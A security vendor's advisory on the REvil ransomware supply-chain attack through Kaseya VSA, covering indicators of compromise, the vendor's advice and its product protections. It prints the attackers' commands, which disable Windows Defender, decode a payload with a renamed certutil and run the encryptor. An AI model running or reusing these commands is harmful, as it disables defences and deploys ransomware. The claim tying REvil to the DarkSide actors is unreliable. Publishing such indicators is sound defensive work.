@@ -1,0 +1,99 @@
+FortiGuard Labs Breaking Update A new global supply chain ransomware attack is currently targeting users of the Kaseya VSA platform—software that provides remote management of IT operations spanning service desk ticketing to performance monitoring and reporting.
+
+As a central management console, the Kaseya VSA platform is used by numerous managed service providers to remotely monitor and deploy software, updates, etc. to multiple machines simultaneously in a multi-user environment.
+
+Unofficial reports have identified the REvil ransomware threat actors as being behind this supply chain attack.
+
+REvil has been attributed to the DarkSide actors who most recently attacked Colonial Pipeline and JBS foods back in May.
+
+Those same unofficial reports claim that a malicious update was deployed to the Kaseya VSA interface by the threat actors as an update or hot fix for the Kaseya VSA agent.
+
+This fake update is a ransomware file, and it has now been downloaded to thousands of systems, including the machines of MSP providers and their customers who use Kaseya VSA.
+
+ There are reports of ransom demands of $50,000 for smaller organizations and up to $5 million for larger enterprises.
+
+Kaseya is urging all customers to take all on-premises VSA servers offline immediately.
+
+Only on-premises systems have been impacted by this attack.
+
+Cloud-based SaaS services remain unaffected.
+
+The Kaseya advisory reads in part: \"ALL ON-PREMISES VSA SERVERS SHOULD CONTINUE TO REMAIN OFFLINE UNTIL FURTHER INSTRUCTIONS FROM KASEYA ABOUT WHEN IT IS SAFE TO RESTORE OPERATIONS.
+
+A PATCH WILL BE REQUIRED TO BE INSTALLED PRIOR TO RESTARTING THE VSA.\" Reports of the attack first surfaced when Huntress Labs, a managed detection and response (MDR) provider, first discovered the attack and posted their findings on Reddit.
+
+Timing the attack for the Independence Day holiday in the United States, this supply chain ransomware attack has impacted hundreds of organizations worldwide, both large and small, across all industries and managed service providers.
+
+Update as of July 7 th : This sophisticated supply-chain ransomware attack initially leveraged a vulnerability in the Kaseya VSA software to gain access to victim organizations, and then used REvil’s RaaS to infect those organizations with ransomware.
+
+For that reason, FortiGuard Labs is providing a separate Outbreak Alert analysis for both the initial exploitation of the Kaseya vulnerability and for the subsequent REvil ransomware attack.
+
+Each Outbreak Alert includes information about the attack itself, Fortinet product versions that provide protection, which products could break the attack sequence, threat hunting techniques, and other information.
+
+Go here for the Kaseya Outbreak Alert and here for the REvil Outbreak Alert .
+
+What to look for Threat indications that you should be aware of include: Initial notifications indicate that the \"KElevated######\" (SQL User) account performed this action.
+
+VSA admin user accounts are disabled only moments before ransomware is deployed Ransomware encryptor is dropped to c:\\kworking\\agent.exe
+
+The VSA procedure is named \"Kaseya VSA Agent Hot-fix” At least two tasks run the following:
+
+C:\\WINDOWS\\system32\\cmd.exe /c ping 127.0.0.1 -n 4979 > nul C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection
+
+AuditMode -Force
+
+-MAPSReporting Disabled -SubmitSamplesConsent NeverSend copy /Y
+
+C:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe echo %RANDOM%
+
+>>
+
+C:\\Windows\\cert.exe C:\\Windows\\cert.exe -decode
+
+c:\\kworking\\agent.crt c:\\kworking\\agent.exe del /q /f c:\\kworking\\agent.crt C:\\Windows\\cert.exe & c:\\kworking\\agent.exe
+
+In addition, the encryptor (agent.exe) is signed with a valid digital signature that includes the following information: Name: PB03 TRANSPORT LTD.
+
+Email: Brouillettebusiness@outlook.com CN =
+
+Sectigo RSA Code Signing, CAO =
+
+Sectigo Limited, L = Salford, S =
+
+Greater Manchester, C = GB Serial #: 119acead668bad57a48b4f42f294f8f0 Issuer: https://sectigo.com/ When agent.exe runs, the following files are dropped into the hardcoded path C:\\Windows: MsMpEng.exe - the legit Windows Defender executable mpsvc.dll - the encryptor payload that is sideloaded by the legit Defender .EXE
+
+Recommendations Fortinet strongly recommends organizations using the Kaseya VSA platform to implement the current guidance in Kaseya's official recommendation : \"IMMEDIATELY shutdown your VSA server until you receive further notice from [Kaseya].”
+
+Fortinet Protections While the Kaseya VSA supply chain attack is how the threat actors got into the different networks, the ransomware used in those attacks is blocked by FortiGuard Labs through its AV coverage against known publicly available samples as: W32/Sodinokibi.
+
+EAD4!tr.ransom W32/Sodinokibi.8859!tr.ransom W32/Sodinokibi.5421!tr.ransom FortiGuard Labs has IPS coverage in place as: Kaseya.
+
+VSA.Remote.
+
+Code.
+
+Execution All known network IOC's are blocked by the WebFiltering client.
+
+The FortiGuard AntiVirus service is supported by FortiGate , FortiMail, FortiClient , and FortiEDR .
+
+The Fortinet AntiVirus engine is a part of each of those solutions as well.
+
+As a result, customers who have these products with up-to-date protections are protected.
+
+For FortiEDR protections, all published IOCs have been added to our Cloud intelligence service and will be blocked if executed on customer systems.
+
+The FortiGuard Responder team has published a Knowledge Base analysis on Kaseya and “ How FortiEDR detects Kaseya supply chain ransomware attack .”
+
+For FortiSandbox, all publicly known ransomware samples are detected by our behavior-based protection.
+
+Appendix The following advisory was posted by Kaseya:
+
+Information Regarding Potential Attack on Kaseya VSA
+
+The following FortiGuard Threat Signal report contains the latest information about this ransomware attack as well as updated information about FortiGuard Labs protections: Global Ransomware and Supply Chain Attack on Kaseya VSA Affecting Multiple Organizations Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio .
+
+Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program .
+
+
+
+
